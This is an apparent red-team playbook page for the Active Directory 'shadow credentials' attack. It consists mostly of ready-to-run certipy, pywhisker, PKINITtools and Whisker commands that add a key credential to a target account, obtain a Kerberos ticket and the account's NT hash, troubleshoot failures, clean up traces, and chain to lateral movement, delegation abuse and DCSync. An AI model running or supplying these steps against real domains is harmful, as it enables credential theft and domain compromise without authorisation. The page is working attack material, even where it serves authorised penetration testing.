# Shadow credentials

## Before I start
- [ ] Write on the target confirmed, as GenericWrite, GenericAll or AddKeyCredentialLink in BloodHound: :Pb acl-abuse
- [ ] A DC on Server 2016 or later and a CA in the domain, so that PKINIT works
At the pwn-broker prompt: tool install certipy.
sudo ntpdate <DCIP>

## In one step
certipy shadow auto -u '<Username>@<Domain>' -p '<Password>' -account '<TargetUser>' -dc-ip <DCIP>
- [ ] It adds a key, logs in with it, prints the NT hash, saves a ccache and puts the old keys back: nothing to clean up, and no .pfx is left

## Step by step
certipy shadow add -u '<Username>@<Domain>' -p '<Password>' -account '<TargetUser>' -dc-ip <DCIP>
certipy auth -pfx '<TargetUser>.pfx' -username '<TargetUser>' -domain <Domain> -dc-ip <DCIP>
- [ ] add saves <TargetUser>.pfx, named without the $ for a computer, and prints the key's device ID, which the clean up needs
- [ ] The result is a TGT and the account's NT hash: the password is untouched, and nothing can lock out

## With pywhisker and PKINITtools
pywhisker, from https://github.com/ShutdownRepo/pywhisker:
pipx install git+https://github.com/ShutdownRepo/pywhisker
pywhisker -d '<Domain>' -u '<Username>' -p '<Password>' --target '<TargetUser>' --action add --filename shadow
PKINITtools, from https://github.com/dirkjanm/PKINITtools, in a virtual environment of its own:
git clone https://github.com/dirkjanm/PKINITtools
python3 -m venv PKINITtools/venv
PKINITtools/venv/bin/pip install impacket minikerberos
PKINITtools/venv/bin/python PKINITtools/gettgtpkinit.py -cert-pfx shadow.pfx -pfx-pass 'THE-PFX-PASSWORD' -dc-ip <DCIP> '<Domain>/<TargetUser>' shadow.ccache
export KRB5CCNAME=shadow.ccache
PKINITtools/venv/bin/python PKINITtools/getnthash.py -key THE-AS-REP-KEY -dc-ip <DCIP> '<Domain>/<TargetUser>'
- [ ] pywhisker prints THE-PFX-PASSWORD and the device ID; gettgtpkinit prints THE-AS-REP-KEY
- [ ] From Windows: Whisker.exe add /target:<TargetUser> /domain:<Domain>, built from https://github.com/eladshamir/Whisker

## If it fails
- [ ] KDC_ERR_PADATA_TYPE_NOSUPP: PKINIT does not work on this DC, with no CA or before 2016, so ForceChangePassword or a targeted roast instead: :Pb acl-abuse, :Pb kerberoasting
- [ ] A computer may add a key to itself only while it has none; my write right over it is not limited that way
- [ ] Errors over plain LDAP, where signing or channel binding is enforced: pywhisker's --use-ldaps, or certipy's -ldap-scheme ldaps

## Clean up
With THE-DEVICE-ID from the add:
certipy shadow remove -u '<Username>@<Domain>' -p '<Password>' -account '<TargetUser>' -device-id THE-DEVICE-ID -dc-ip <DCIP>
pywhisker -d '<Domain>' -u '<Username>' -p '<Password>' --target '<TargetUser>' --action remove --device-id THE-DEVICE-ID
- [ ] From Windows: Whisker.exe remove /target:<TargetUser> /domain:<Domain> /deviceid:THE-DEVICE-ID

## Next
- [ ] A user's NT hash: :Pb lateral-movement
- [ ] A computer taken over: resource-based constrained delegation onto a host that matters, :Pb delegation
- [ ] A DC's account: :Pb dcsync
